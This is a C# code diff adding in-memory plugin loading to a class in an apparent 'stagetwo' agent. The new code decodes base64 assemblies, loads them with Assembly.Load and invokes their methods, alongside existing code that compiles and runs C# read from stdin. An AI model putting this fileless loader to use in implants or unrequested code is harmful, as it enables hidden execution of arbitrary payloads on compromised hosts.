@@ -1,7 +1,13 @@
-﻿namespace stagetwo
+﻿using System;
+using System.Collections.Generic;
+using System.Reflection;
+
+namespace stagetwo
 {
     class Reflection
     {
+        public static List<Type> loaded_plugins = new List<Type>();
+
         public void compile(System.IO.StreamReader stdin)
         {
             var cp = new System.CodeDom.Compiler.CompilerParameters()
@@ -30,6 +36,40 @@
 
             var obj = r.CompiledAssembly.CreateInstance("command");
             obj.GetType().GetMethod("main").Invoke(obj, new object[] { });
+        }
+
+        public static object load(string obj)
+        {
+            byte[] assembly_data = Convert.FromBase64String(obj);
+            Assembly assembly = Assembly.Load(assembly_data);
+
+            Type plugin = assembly.GetType("Plugin");
+            if ( plugin == null)
+            {
+                throw new Protocol.ProtocolError(-1, "no Plugin class found");
+            }
+
+            var entry = plugin.GetMethod("entry", BindingFlags.Public | BindingFlags.Static);
+            if (entry != null)
+            {
+                entry.Invoke(null, new object[] { typeof(Reflection).Assembly });
+            }
+
+            loaded_plugins.Add(plugin);
+
+            return (loaded_plugins.Count - 1);
+        }
+
+        public static object call(int id, string method, object[] args)
+        {
+            if( id < 0 || id >= loaded_plugins.Count ){
+                throw new Protocol.ProtocolError(-1, "invalid assembly id");
+            }
+
+            return loaded_plugins[id].GetMethod(
+                method, 
+                BindingFlags.Public | BindingFlags.Static
+            ).Invoke(null, args);
         }
 
     }
